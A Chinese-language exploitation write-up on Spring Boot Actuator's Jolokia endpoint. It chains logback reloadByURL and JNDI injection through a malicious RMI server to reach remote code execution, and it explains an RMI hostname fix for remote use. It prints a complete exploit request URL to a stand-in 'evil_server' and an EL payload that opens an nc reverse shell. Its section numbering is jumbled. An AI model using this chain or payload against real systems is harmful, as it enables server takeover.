0x00  Spring Boot Actuator 简介

Spring 是一个轻量级的 java 开发框架，而 Spring Boot 可以让开发者更加快速的开发 Spring 应用程序。其最大的特点就是自动化配置，能根据类路径下面的 jar 包和配置，动态加载配置和注入 bean。Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。

这样根据路由处理规则，就可以构造我们的路由为：/jolokia/exec/object_name/operation_name/arguments ，接下来，就是解决如何找到可利用的 Mbeans 的问题了。

可以查看一下 /jolokia/list 中存在的 Mbeans，这里我们重点看将要利用的 logback 库提供的reloadByURL方法。

这个 reloadByURL 方法，允许我们直接从 URL 加载一个 logback.xml  配置文件，并且解析 xml 文件的时候，未做任何过滤措施。那么这里起码可以有一个 XXE 攻击，然后通过查找 logback.xml 相关配置内容，可以找到这么个有趣的标签insertFromJNDI ，这个标签允许我们从 JNDI 加载变量。

<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName">

可以大略看一下 insertFromJNDIAction类是如何解析这个标签的。那么就会发现如果定义了 env-entry-name属性的值 ，这个值最终会经过 lookup() 方法。惊喜的是，这个属性值可控。如果将 env-entry-name 设置为恶意 RMI 服务地址，接下来就是比较常规的利用 JNDI 注入操作了。

至此，我们已经分析完一整条路由利用链：

http://target_site/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/evil_server!/logback.xml

0x02  JNDI 注入

当然，JNDI 注入有各种各样的方法，并且各种 JDK 版本限制也不同。参考链接 https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html ，这里利用的是文章中 kingx 大佬提供的方法：利用本地 Class 作为 Reference Factory class ，来绕过高版本 JDK 的限制。

现在，我们来梳理一下整个利用流程：

1. 构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件；

2. 解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI 为恶意 RMI 服务地址；

3. 恶意 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class 的类名、属性、属性值（这里为 ELProcessor 、x、eval(...)）；

4. 目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用 factory.getObjectInstance() 方法，通过反射的方式实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值。对应我们的代码，最终调用 setter 方法的时候，就是执行如下代码：

ELProcessor.eval(\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil-server-ip port >/tmp/f']).start()\"

而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE 的效果。

0x01  远程复现分析

由前面分析可知，我们复现此漏洞，仅仅需要准备：

  1. 能获取logback.xml的 Web 服务

  2. 能进行 JNDI注入的恶意 RMI 服务

如果参考文章 https://github.com/mpgn/Spring-Boot-Actuator-Exploit 的复现流程，在本地搭建环境进行测试，即目标服务、两个恶意服务均属于同一局域网，成功 RCE 是没有任何问题的。但是，仿照真实环境，将两个恶意服务均放在公网的 VPS 上进行远程利用时，就会发现目标确实反连到我们的 RMI 服务器了，却并没有成功如我们所设想的，去加载远程对象 jndi。

0x02  RMI 远程对象调用流程

  • 如果 Client 端向 RMI 请求一个远程对象，那么 RMI 会给 Client 端传递一个远程对象的 Stub。Stub 可以相当于是对远程对象的引用或者代理，其中包含了远程对象的 Socket 端口、Server 端主机地址等信息。而 Stub 的一种获取方式，就是通过调用远程方法。但是调用远程方法又必须得先有远程对象的 Stub 。那么这里就会出现一个死循环的问题。于是，JDK 提供了一个 RMIRegistry 来解决问题。

  • 那么当有了 RMIRegistry 之后，RMI 的远程对象的调用流程如下图：

  • 由图可知，当 Client 端向 RMIRegistry 查询某个远程对象的名称（2）时，如果这个远程对象存在于注册表中（即 Server 端已经注册（1）的远程对象），那么 RMIRegistry 将会给 Client 端（3）返回这个远程对象的 Stub。Client 端根据 Stub 中的信息，去对应的 Server 端（4）调用远程方法。

  • 所以从 Client 端的角度来看， Server 端其实是有两个端口：RMIRegistry 端口和远程对象通信端口。对应上述我们的 RMI 恶意服务代码。可以发现，我们其实只设置了 RMIRegistry 端口为 1099。虽然远程对象的通信端口是随机分配的，但是我们并没有设置远程通信对象的 Host ，而其默认值是 Server 端本地主机名对应的 IP 地址。

  • 至此，终于知道上述远程复现流程中， RMI 服务返回的那个内网 IP 其实是远程对象的 Host 。既然Host 都是错的，又何谈去加载远程对象呢。所以，解决的办法很多。这里我们只需在 RMI 恶意服务代码中加入以下代码，指定通信 Host 即可。

    System.setProperty("java.rmi.server.hostname","外网IP");
